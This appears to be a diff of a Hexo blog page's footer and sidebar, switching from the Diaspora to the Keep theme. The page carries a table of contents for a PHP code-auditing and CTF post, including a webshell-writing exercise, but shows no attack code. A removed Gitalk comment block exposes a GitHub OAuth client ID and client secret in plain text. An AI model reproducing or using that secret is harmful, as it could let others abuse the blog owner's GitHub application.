class="nav-text">不严谨的正则表达式</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2022.04.28</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Charmersix</a>
+            
         </div>
         
-    <div id="gitalk-container" class="comment link"
-		data-enable="true"
-        data-ae="false"
-        data-ci="f71ceda7a670da0dc3de"
-        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
-        data-r="blog_comments"
-        data-o="Charmersix"
-        data-a="Charmersix"
-        data-d="false"
-    >查看评论</div>
-
-
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
     </div>
+</footer>
+
+        </div>
+    </div>
+
     
-        <div class="side">
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">了解系统架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E4%BA%86%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="toc-number">2.</span> <span class="toc-text">使用了开发框架</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#think-PHP"><span class="toc-number">2.1.</span> <span class="toc-text">think PHP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#laravel"><span class="toc-number">2.2.</span> <span class="toc-text">laravel</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="toc-number">3.</span> <span class="toc-text">没有使用开发框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%BF%87%E6%BB%A4%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">参数过滤分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mvc%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">mvc模式下的过滤情况分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%94%9Fphp%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%BF%87%E6%BB%A4%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">原生php模式下的过滤分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E5%87%A0%E4%B8%AA%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">做几个题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#301"><span class="toc-number">5.1.</span> <span class="toc-text">301</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#302"><span class="toc-number">5.2.</span> <span class="toc-text">302</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">5.2.1.</span> <span class="toc-text">写入一句话木马</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#303"><span class="toc-number">5.3.</span> <span class="toc-text">303</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#304"><span class="toc-number">5.4.</span> <span class="toc-text">304</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#305"><span class="toc-number">5.5.</span> <span class="toc-text">305</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#306"><span class="toc-number">5.6.</span> <span class="toc-text">306</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#307"><span class="toc-number">5.7.</span> <span class="toc-text">307</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#308"><span class="toc-number">5.8.</span> <span class="toc-text">308</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#309"><span class="toc-number">5.9.</span> <span class="toc-text">309</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#310"><span class="toc-number">5.10.</span> <span class="toc-text">310</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">常见漏洞审计方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS"><span class="toc-number">6.2.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF"><span class="toc-number">6.3.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF"><span class="toc-number">6.4.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">6.5.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">6.6.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E5%88%A0%E9%99%A4%E3%80%81%E4%B8%8B%E8%BD%BD"><span class="toc-number">6.7.</span> <span class="toc-text">文件上传、删除、下载</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.7.1.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">6.7.2.</span> <span class="toc-text">文件删除</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">6.7.3.</span> <span class="toc-text">文件写入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.8.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE"><span class="toc-number">6.9.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.10.</span> <span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">审计技巧总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GPC"><span class="toc-number">7.1.</span> <span class="toc-text">GPC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98"><span class="toc-number">7.2.</span> <span class="toc-text">利用字符处理问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99"><span class="toc-number">7.2.1.</span> <span class="toc-text">利用字符处理函数报错</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E6%96%AD"><span class="toc-number">7.2.2.</span> <span class="toc-text">利用字符串截断</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8D%E4%B8%A5%E8%B0%A8%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">7.2.3.</span> <span class="toc-text">不严谨的正则表达式</span></a></li></ol></li></ol></li></ol>	
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
         </div>
     
-</div>
 
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
 
     </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
 </body>
-
-<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-
-
-<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
-<script src="/js/plugin.js"></script>
-<script src="/js/typed.js"></script>
-<script src="/js/diaspora.js"></script>
-
-
-<link rel="stylesheet" href="/photoswipe/photoswipe.css">
-<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
-
-
-<script src="/photoswipe/photoswipe.min.js"></script>
-<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
-
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-
-
-
 </html>
